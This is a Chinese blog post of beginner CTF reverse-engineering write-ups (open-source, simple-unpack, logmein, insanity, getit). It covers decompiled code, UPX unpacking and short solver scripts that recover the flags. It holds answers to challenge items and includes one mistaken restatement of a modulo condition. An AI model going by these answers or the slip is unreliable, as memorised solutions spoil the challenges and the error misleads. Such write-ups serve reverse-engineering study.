<h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>给出题目给的代码，不算真正的逆向，考验一下读取代码的水平吧。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br>    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"what?\n"</span>);<br>    	<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> first = atoi(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">if</span> (first != <span class="hljs-number">0xcafe</span>) &#123;<br>    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"you are wrong, sorry.\n"</span>);<br>    	<span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> second = atoi(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">if</span> (second % <span class="hljs-number">5</span> == <span class="hljs-number">3</span> || second % <span class="hljs-number">17</span> != <span class="hljs-number">8</span>) &#123;<br>    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"ha, you won't get it!\n"</span>);<br>    	<span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">"h4cky0u"</span>, argv[<span class="hljs-number">3</span>])) &#123;<br>    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"so close, dude!\n"</span>);<br>    	<span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Brr wrrr grr\n"</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> hash = first * <span class="hljs-number">31337</span> + (second % <span class="hljs-number">17</span>) * <span class="hljs-number">11</span> + <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">3</span>]) - <span class="hljs-number">1615810207</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Get your key: "</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%x\n"</span>, hash);<br>    system(<span class="hljs-string">"pause"</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br>    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"what?\n"</span>);<br>    	<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<p>先分析第一步，判断argc数组中，当用户输入的参数个数不为四时，输出what?之后退出。<br>由此我们可以看出，我们需要输入四个字符串。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> first = atoi(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">if</span> (first != <span class="hljs-number">0xcafe</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"you are wrong, sorry.\n"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>    &#125;<br></code></pre></div></td></tr></table></figure>
<p>接着分析，atoi函数的作用是将argv所指向的字符串转换为一个整数（类型为 int 型）。如果  <code>first!=0xcafe，</code><br>输出 <code>you are wrong, sorry，</code>退出。但是我们需要进行下一行，所以可知，<code>argv[1]=&quot;51966&quot;</code> (十进制后的0xcafe)</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> second = atoi(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">if</span> (second % <span class="hljs-number">5</span> == <span class="hljs-number">3</span> || second % <span class="hljs-number">17</span> != <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ha, you won't get it!\n"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<p>接着分析这一串代码，将用户输入赋值给second，判断如果 <code>second%=5==3</code> 或者，<code>second%17!=0，</code> 输出 <code>ha, you won&#39;t get it!</code> 我们需要进行下一行，所以要求不能判断为true，则需要  <code>second%5!=3</code>  或者  <code>second%17==0</code>;</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">"h4cky0u"</span>, argv[<span class="hljs-number">3</span>])) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"so close, dude!\n"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<p>匹配”h4cky0u”与argv[3]中的字符串，如果大于或小于返回非零，输出  so close, dude!  所以我们需要令argv[3]为”h4cky0u”<br>给出代码：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">   argc = <span class="hljs-number">4</span>;<br>argv[<span class="hljs-number">0</span>] = <span class="hljs-string">"test"</span>;               <span class="hljs-comment">//argv[1]可以随意</span><br>argv[<span class="hljs-number">1</span>] = <span class="hljs-string">"51966"</span>;<br>   argv[<span class="hljs-number">2</span>] = <span class="hljs-string">"25"</span>;<br>   argv[<span class="hljs-number">3</span>] = <span class="hljs-string">"h4cky0u"</span>;<br></code></pre></div></td></tr></table></figure>

<img src="https://qiniuyun1.fxhstudy.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C--open-source.png" srcset="/img/loading.gif"  alt="1" />



<h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><p>附件给出文件，用Exeinfo分析文件</p>
<img src="https://qiniuyun1.fxhstudy.com/simple-unpack-1.png" srcset="/img/loading.gif"  alt="1" />


<p>得到的信息是  1、64位文件；2、UPX加壳(具体加壳原理这里不解释，根据深度了解)<br>两种方法：<br>1、直接搜索字符串(简单的才会出现这种，本题可以)<br>直接拖进IDA中，用二进制，注意，这里需要IDA64位的，shift+F12,输入flag,查找字符串，最后能找到了flag。</p>
<img src="https://qiniuyun1.fxhstudy.com/simple-unpack-2.png" srcset="/img/loading.gif"  alt="1" />

<p>2、UPX脱壳<br><img src="https://qiniuyun1.fxhstudy.com/simple-unpack-3.png" srcset="/img/loading.gif"  alt="1" /></p>
<p>脱壳之后，直接拖进IDA中，可以看到，脱壳之后的文件</p>
<img src="https://qiniuyun1.fxhstudy.com/simple-unpack-4.png" srcset="/img/loading.gif"  alt="1" />

<p>查看main函数即可得到flag。</p>
<p>===============================<br>总结：<br>    1、有时给的文件，分析文件后，可以直接拖进IDA/OD中，直接搜索flag，可能会有不一样的结果。<br>    2、本题考了UPX加壳，原理不难，但要如果要学逆向的话，一定要了解。</p>
<h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><p>和我们平常的逆向不同，CTF中的逆向，是涉及到算法的，所以对于代码水平也需要比较严格的要求。<br>这题就涉及到了简单的算法。</p>
<p>===============================<br>先将所给的附件拖进Exeinfo中分析：1、64位文件； 2、Linux下的ELF文件</p>
<img src="https://qiniuyun1.fxhstudy.com/logmein-1.png" srcset="/img/loading.gif"  alt="1" />

<p>拖进IDA，shift+F12,查看字符串</p>
<img src="https://qiniuyun1.fxhstudy.com/logmein-2.png" srcset="/img/loading.gif"  alt="1" />

<p>看到比较重要的几句话。</p>
<p>接着选中main函数，F5进行反编译，得到伪代码：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall __noreturn <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span><br></span>&#123;<br>  <span class="hljs-keyword">size_t</span> v3; <span class="hljs-comment">// rsi</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+3Ch] [rbp-54h]</span><br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">36</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-50h]</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+64h] [rbp-2Ch]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+68h] [rbp-28h]</span><br>  <span class="hljs-keyword">char</span> v8[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-20h]</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+8Ch] [rbp-4h]</span><br><br>  v9 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">strcpy</span>(v8, <span class="hljs-string">":\"AL_RT^L*.?+6/46"</span>);<br>  v7 = <span class="hljs-number">28537194573619560L</span>L;<br>  v6 = <span class="hljs-number">7</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome to the RC3 secure password guesser.\n"</span>, a2, a3);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"To continue, you must enter the correct password.\n"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Enter your guess: "</span>);<br>  __isoc99_scanf(<span class="hljs-string">"%32s"</span>, s);<br>  v3 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-built_in">strlen</span>(v8) )<br>    sub_4007C0(v8);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(s); ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-built_in">strlen</span>(v8) )<br>      ((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))sub_4007C0)();<br>    <span class="hljs-keyword">if</span> ( s[i] != (<span class="hljs-keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )<br>      ((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))sub_4007C0)();<br>  &#125;<br>  sub_4007F0();<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>追踪一下sub_4007C0这个函数,</p>
<img src="https://qiniuyun1.fxhstudy.com/logmein-3.png" srcset="/img/loading.gif"  alt="1" />

<p>发现是错误输入函数。<br>分析代码，发现 <code>__isoc99_scanf(&quot;%32s&quot;, s);</code>  这条代码，用户输入，即flag。\</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(s); ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-built_in">strlen</span>(v8) )<br>      ((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))sub_4007C0)();<br>    <span class="hljs-keyword">if</span> ( s[i] != (<span class="hljs-keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )<br>      ((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))sub_4007C0)();<br>  &#125;<br></code></pre></div></td></tr></table></figure>
<p>两种方法：</p>
<h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>然后将用户输入的flag，这里的v7，我并不知道什么意思，v8是进行异或，看了wp后，这里解释：</p>
<p>LL是长长整型，v7要转换为16进制然后在转换为字符串，而且字符是小端序( 值得注意的是，x86系列的CPU都是以小端序储存数据的，即低位字节存入低地址，高位字节存入高地址，所以正确的字符串应该反过来 )，所以把得到的字符翻转然后和v8的每一位进行异或。</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">print(hex(<span class="hljs-number">28537194573619560</span>))<br><span class="hljs-comment"># 0x65626d61726168</span><br><br>print([chr(int(i, <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">"0x65 0x62 0x6d 0x61 0x72 0x61 0x68"</span>.split()])<br><span class="hljs-comment"># 0x65 0x62 0x6d 0x61 0x72 0x61 0x68</span><br></code></pre></div></td></tr></table></figure>

<p>给出python代码，这里先将v7转化成16进制，再将十六进制转化成ASCII码，得到字符串，</p>
<img src="https://qiniuyun1.fxhstudy.com/logmein-4.png" srcset="/img/loading.gif"  alt="1" />

<p>又因为CPU是小端存储(这个涉及到内存的存储格式，逆向必备知识)，v7=harambe<br>贴出脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">v7 = <span class="hljs-string">'harambe'</span><br>v8 = <span class="hljs-string">':\"AL_RT^L*.?+6/46'</span><br>tmp = <span class="hljs-string">''</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(v8)):<br>    c = ord(v7[i % <span class="hljs-number">7</span>]) ^ ord(v8[i])<br>    tmp += chr(c)<br><br>print(tmp)<br></code></pre></div></td></tr></table></figure>


<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>这个方法不用理解那么多，就根据它的代码来，写代码，我比较偏向脚本二，这里直接贴上脚本</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BYTE unsigned char</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">char</span> v8[<span class="hljs-number">18</span>] = <span class="hljs-string">":\"AL_RT^L*.?+6/46"</span>;<br>    __int64 v7 = <span class="hljs-number">28537194573619560</span>;<br>    <span class="hljs-keyword">int</span> v6 = <span class="hljs-number">7</span>;<br><br>    <span class="hljs-keyword">char</span> s[<span class="hljs-number">18</span>] = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(v8); ++i) &#123;<br>        s[i] = (<span class="hljs-keyword">char</span>)(*((BYTE*)&amp;v7 + i % v6)^v8[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, s);<br><br>    system(<span class="hljs-string">"PAUSE"</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>两种方法都可以得到flag值，但是下面的方法直接就根据代码写脚本，比较好理解.</p>
<p>=========================<br>总结：<br>    1、CTF中，逆向考的不仅仅是你的逆向水平，还有审计代码的水平，一个好的reverse选手，需要两者兼备；<br>    2、我们在根据算法写脚本时，根据代码来写脚本，会更加高效，省时。</p>
<h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p>这题真的。。。。太简单了，确实可以缓和一下。</p>
<img src="https://qiniuyun1.fxhstudy.com/insanity-1.png" srcset="/img/loading.gif"  alt="1" />

<p>首先放入Exeinfo分析，得到信息：<br>    32位文件</p>
<p>接着拖入32位IDA中，用二进制打开，shift+F12,查看字符串</p>
<img src="https://qiniuyun1.fxhstudy.com/insanity-2.png" srcset="/img/loading.gif"  alt="1" />

<p>看到这个我就懵逼了，这么简单？然后输入flag值，发现正确。<br>不敢相信这么简单，搜了一下wp，发现真的就是这样。<br>没什么好总结，送分题而已。</p>
<h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p>这题考的也是算法。</p>
<p>得到附件，拖入Exeinfo中</p>
<img src="https://qiniuyun1.fxhstudy.com/getit-1.png" srcset="/img/loading.gif"  alt="1" />

<p>得到信息：64位文件。</p>
<p>知道64位后，拖入64位IDA中，用二进制打开，shift+F12，看看有没有什么有用的字符串</p>
<img src="https://qiniuyun1.fxhstudy.com/getit-2.png" srcset="/img/loading.gif"  alt="1" />

<p>看到了SharifCTF{????????????????????????????????}，这个肯定不是正确的flag，<br>再用IDA打开，F5反编译，查看伪代码。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span><br></span>&#123;<br>  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// al</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-keyword">char</span> filename[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  LODWORD(v5) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v5 &lt; <span class="hljs-built_in">strlen</span>(s) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v5 &amp; <span class="hljs-number">1</span> )<br>      v3 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>      v3 = <span class="hljs-number">-1</span>;<br>    *(&amp;t + (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v5 + <span class="hljs-number">10</span>) = s[(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v5] + v3;<br>    LODWORD(v5) = v5 + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(filename, <span class="hljs-string">"/tmp/flag.txt"</span>);<br>  stream = fopen(filename, <span class="hljs-string">"w"</span>);<br>  <span class="hljs-built_in">fprintf</span>(stream, <span class="hljs-string">"%s\n"</span>, u, v5);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(&amp;t); ++i )<br>  &#123;<br>    fseek(stream, p[i], <span class="hljs-number">0</span>);<br>    fputc(*(&amp;t + p[i]), stream);<br>    fseek(stream, <span class="hljs-number">0L</span>L, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">fprintf</span>(stream, <span class="hljs-string">"%s\n"</span>, u);<br>  &#125;<br>  fclose(stream);<br>  <span class="hljs-built_in">remove</span>(filename);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这里贴出伪代码，分析一下代码，发现存在指针 t 不知道指向哪里，数组 s 不知道值为多少，<br>追踪指针 t 和 数组 s</p>
<img src="https://qiniuyun1.fxhstudy.com/getit-3.png" srcset="/img/loading.gif"  alt="1" />

<img src="https://qiniuyun1.fxhstudy.com/getit-4.png" srcset="/img/loading.gif"  alt="1" />

<p>发现了 s 和 t 的值。<br>知道这些后，我们就可以分析代码了，</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>LODWORD(v5) = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v5 &lt; <span class="hljs-built_in">strlen</span>(s) )<br>&#123;<br>  <span class="hljs-keyword">if</span> ( v5 &amp; <span class="hljs-number">1</span> )<br>    v3 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">else</span><br>    v3 = <span class="hljs-number">-1</span>;<br>  *(&amp;t + (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v5 + <span class="hljs-number">10</span>) = s[(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v5] + v3;<br>  LODWORD(v5) = v5 + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p><code>__readsqword(0x28u)</code> 通常用于alarm函数，防止调试，<br>接着while循环，如果v5小于数组 s 的字节长度，则进行循环，v5和1相与，如果不为零，则将1赋值给v3,否则将-1赋值给v3,然后就是指针的移位赋值了，最后v5自增加一。但是出现了一点问题，当 t 指向harifCTF{????????????????????????????????}时，运行出来的是这样的，</p>
<img src="https://qiniuyun1.fxhstudy.com/getit-5.png" srcset="/img/loading.gif"  alt="1" />

<p>再回到一开始我们查看字符串那里，尝试将指针 t 指向 SharifCTF{????????????????????????????????}，成功。<br>（t的值应该是0x53+’harifCTF{????????????????????????????????}’）</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>	<br>	<span class="hljs-keyword">char</span> a[] = <span class="hljs-string">"c61b68366edeb7bdce3c6820314b7498"</span>;<br>	<span class="hljs-keyword">char</span> b[] = <span class="hljs-string">"SharifCTF&#123;????????????????????????????????&#125;"</span>;<br>	<span class="hljs-keyword">int</span> v5 = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">int</span> v3;<br>	<span class="hljs-keyword">while</span>(v5 &lt; <span class="hljs-built_in">strlen</span>(a))&#123;<br>		<span class="hljs-keyword">if</span>( v5 &amp; <span class="hljs-number">1</span> )	<br>			v3 = <span class="hljs-number">1</span>;<br>		<span class="hljs-keyword">else</span><br>			v3 = <span class="hljs-number">-1</span>;<br>		*(b + v5 + <span class="hljs-number">10</span>) = a[v5] + v3;<br>		v5++;	<br>	&#125;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, b);<br>	<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>====================================<br>总结：<br>    这题考得也是算法，对调试文件的操作不多，可以说没有，也是CTF的考法的特点之一。</p>
<h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><p>这题考的是对python的反编译</p>
